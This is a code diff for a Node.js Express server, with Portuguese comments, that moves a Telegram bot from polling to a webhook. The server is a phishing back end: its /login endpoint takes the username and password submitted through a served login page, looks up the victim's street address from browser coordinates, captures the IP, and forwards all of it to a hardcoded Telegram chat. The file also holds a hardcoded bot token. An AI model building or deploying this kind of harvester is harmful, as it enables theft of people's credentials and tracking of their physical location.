@@ -2,18 +2,31 @@ const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
-const axios = require('axios'); // Para geocodificação
+const axios = require('axios');
 
 const app = express();
 app.use(bodyParser.json());
-app.use(cors()); // Habilitar CORS para todas as origens
+app.use(cors());
 
-// Usar variáveis de ambiente para token e chatId (configuradas no Render)
 const token = process.env.TOKEN || '7618938431:AAHrrR5AEdE4pirgLf_02TPX5hePY9tHb5Y';
 const chatId = process.env.CHAT_ID || '5114449108';
-const bot = new TelegramBot(token, { polling: true });
+const bot = new TelegramBot(token, { polling: false }); // Desativar polling
 
-// Função para obter endereço a partir de coordenadas usando Nominatim
+// Configurar webhook (substitua pela URL do seu app no Render)
+const webhookUrl = 'https://seu-app.onrender.com/telegram-webhook';
+bot.setWebHook(webhookUrl).then(() => {
+    console.log(`Webhook configurado: ${webhookUrl}`);
+}).catch(err => {
+    console.error('Erro ao configurar webhook:', err);
+});
+
+// Endpoint para receber atualizações do Telegram
+app.post('/telegram-webhook', (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
+
+// Função para geocodificação
 async function getAddressFromCoordinates(latitude, longitude) {
     try {
         const response = await axios.get(
@@ -27,24 +40,20 @@ async function getAddressFromCoordinates(latitude, longitude) {
     }
 }
 
-// Configurar endpoint para receber dados do formulário
+// Endpoint para login
 app.post('/login', async (req, res) => {
     const { username, password, latitude, longitude } = req.body;
-    
-    // Capturar o IP real do cliente
     const clientIp = req.headers['x-forwarded-for'] || req.ip;
 
     if (!username || !password) {
         return res.status(400).json({ status: 'error', message: 'Usuário e senha são obrigatórios' });
     }
 
-    // Obter endereço a partir das coordenadas, se disponíveis
     let address = 'N/A';
     if (latitude && longitude) {
         address = await getAddressFromCoordinates(latitude, longitude);
     }
 
-    // Enviar dados para o Telegram
     const message = `Novo login:\nUsuário: ${username}\nSenha: ${password}\nEndereço: ${address}\nIP: ${clientIp}`;
     bot.sendMessage(chatId, message)
         .then(() => {
@@ -56,23 +65,20 @@ app.post('/login', async (req, res) => {
         });
 });
 
-// Servir a página HTML
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/index.html');
 });
 
-// Iniciar o servidor na porta dinâmica do Render
 app.listen(process.env.PORT || 3000, () => {
     console.log(`Servidor rodando na porta ${process.env.PORT || 3000}`);
 });
 
-// Comando para obter o Chat ID
+// Comandos do bot
 bot.onText(/\/getid/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, `O Chat ID deste chat é: ${chatId}`);
 });
 
-// Resposta básica do bot
 bot.on('message', (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, 'Bot ativo! Use /getid para ver o Chat ID deste chat.');
